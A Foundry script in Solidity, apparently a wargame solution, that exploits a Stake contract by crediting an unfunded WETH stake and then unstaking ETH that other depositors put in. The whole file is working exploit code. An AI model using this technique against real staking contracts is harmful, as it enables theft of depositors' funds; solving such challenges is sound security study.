// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Stake} from "../src/Stake.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract DummyStaker {
    Stake public target;
    constructor(address _target) {
        target = Stake(_target);
    }
    function stakeETH() external payable {
        target.StakeETH{value: msg.value}();
    }
}

contract StakeScript is Script {
    function run() external {
        vm.startBroadcast();

        Stake target = Stake(0x8371c79e5226C50088064685d30c9FF4e35e1D2C);
        address WETH = target.WETH();

        uint256 amount = 0.001 ether + 1;

        DummyStaker a = new DummyStaker(address(target));
        a.stakeETH{value: amount + 1}();

        console.log("After Dummy Player stakeETH:");
        console.log(" - Contract ETH:", address(target).balance);
        console.log(" - totalStaked :", target.totalStaked());

        IERC20(WETH).approve(address(target), type(uint256).max);
        target.StakeWETH(amount);

        console.log("After Attacker StakeWETH:");
        console.log(" - Contract ETH:", address(target).balance);
        console.log(" - totalStaked :", target.totalStaked());

        uint256 beforeBal = msg.sender.balance;
        target.Unstake(amount);
        uint256 afterBal = msg.sender.balance;

        console.log("After Player Unstake:");
        console.log(" - Player gained:", afterBal - beforeBal);
        console.log(" - Contract ETH :", address(target).balance);
        console.log(" - totalStaked  :", target.totalStaked());

        vm.stopBroadcast();
    }
}
